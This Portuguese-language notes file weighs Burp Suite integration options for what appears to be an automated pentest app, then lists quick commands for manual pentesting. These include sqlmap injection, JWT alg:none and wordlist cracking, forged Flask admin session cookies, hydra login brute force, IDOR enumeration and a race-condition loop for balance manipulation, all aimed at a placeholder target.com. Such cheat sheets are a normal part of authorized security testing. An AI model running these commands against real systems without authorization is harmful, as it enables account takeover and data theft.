================================================================
  BURP SUITE — INTEGRACAO
================================================================

O QUE O APP FAZ COM BURP AGORA:
  - Apenas lanca o Burp Suite em background
  - NAO intercepta nem manipula requests automaticamente

PARA INTEGRAR MELHOR (3 opcoes):

  OPCAO 1 — BURP PRO REST API (pago ~$450/ano)
    Burp Pro tem API em http://localhost:1337/v0.1/
    Permite: disparar scans, ver issues, controlar intercept
    O app poderia chamar essa API via MCP server

  OPCAO 2 — PROXY TOOLS PELO BURP (gratis, ja possivel)
    Correr tools com --proxy http://127.0.0.1:8080
    Burp ve todo o trafego das tools automaticamente
    Ex: curl --proxy http://127.0.0.1:8080 https://target.com

  OPCAO 3 — O QUE JA TEMOS SUBSTITUI O BURP REPEATER:
    cookie_tamper  -> manipula cookies e headers via curl
    xss_inject     -> envia payloads customizados
    race_cond      -> multiplos requests simultaneos
    shell tool     -> qualquer curl customizado

CONCLUSAO:
  Para 90% do pentest automatizado, o que ja temos substitui
  o Burp. O Burp e mais util para analise manual e visual de
  requests — isso nao e automatizavel sem a versao Pro.

================================================================
  COMANDOS RAPIDOS — PENTEST MANUAL
================================================================

# Descobrir subdomains
subfinder -d target.com -silent | httpx -title -tech-detect -status-code

# Scan completo Nuclei
nuclei -u https://target.com -t cves,misconfig,exposures,vulnerabilities,default-logins,takeovers,ssti,lfi,xss,ssrf -severity critical,high,medium

# SQLi rapido
sqlmap -u "https://target.com/page?id=1" --batch --dbs --level=3 --risk=3

# JWT attack
jwt_tool TOKEN -X a                            # alg:none
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # brute force

# Flask session
flask-unsign --decode --cookie "SESSION_COOKIE"
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'secret'

# Brute force login
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Cookie tamper
curl -si https://target.com -H "Cookie: role=admin; isAdmin=true; user_id=1"

# IDOR test
for i in $(seq 1 20); do curl -si "https://target.com/api/user/$i" | grep -i 'email\|name\|200'; done

# Race condition (balance manipulation)
for i in $(seq 1 20); do curl -X POST "https://target.com/transfer" -d "amount=100" & done; wait

# WPScan
wpscan --url https://target.com --enumerate vp,u,ap --api-token TUA_KEY
